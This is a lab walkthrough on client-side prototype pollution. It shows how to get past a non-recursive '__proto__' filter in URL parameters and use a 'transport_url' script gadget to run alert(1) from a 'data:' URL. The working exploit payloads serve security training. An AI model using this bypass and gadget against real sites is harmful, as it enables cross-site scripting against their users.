# Lab: Client-side Prototype Pollution via Flawed Sanitization

## Objective

Exploit client-side prototype pollution to inject a malicious `transport_url` property, causing the application to dynamically load a JavaScript file from a `data:` URL and execute arbitrary JavaScript.

---

## Steps to Solve

### 1. Identify Prototype Pollution

The application is vulnerable to prototype pollution via URL parameters.

Use the following payload:

```http
GET /?__pro__proto__to__[foo]=bar
```

The sanitization removes only the first occurrence of `__proto__`, resulting in:

```javascript
__proto__[foo]=bar
```

which pollutes `Object.prototype`.

---

### Step 1 – Bypassing the Sanitization

![Bypassing Sanitization](bypassing-sanitization-of-__proto__-as-it-is-not-recursive.png)

---

### 2. Inspect the JavaScript

Open Developer Tools and inspect `searchLoggerFiltered.js`.

Relevant code:

```javascript
let config = {
    params: deparam(new URL(location).searchParams.toString())
};

if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

Notice:

- `config.transport_url` is never initialized.
- If it exists on `Object.prototype`, the application will load it as a script.

---

### Step 2 – Finding the Gadget

![Finding Gadget](identifying-gadget-to-exploit.png)

---

### 3. Verify the Sink

Pollute `transport_url`:

```http
GET /?__pro__proto__to__[transport_url]=bar
```

Inspect the DOM.

You'll notice:

```html
<script src="bar"></script>
```

This confirms that the polluted property is being used.

---

### Step 3 – Script Injection Sink

![Script Sink](secript-can-be-executed-via-this-sink.png)

---

### 4. Exploit Using a `data:` URL

Use the following payload:

```http
GET /?__pro__proto__to__[transport_url]=data:,alert(1);
```

The application creates:

```html
<script src="data:,alert(1);"></script>
```

The browser loads the JavaScript from the `data:` URL and executes:

```javascript
alert(1);
```

---

### Step 4 – Successful Exploit

![Alert Executed](exploitng-prototype-pollution-to-generate-alert.png)

---

## Payload

```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
```
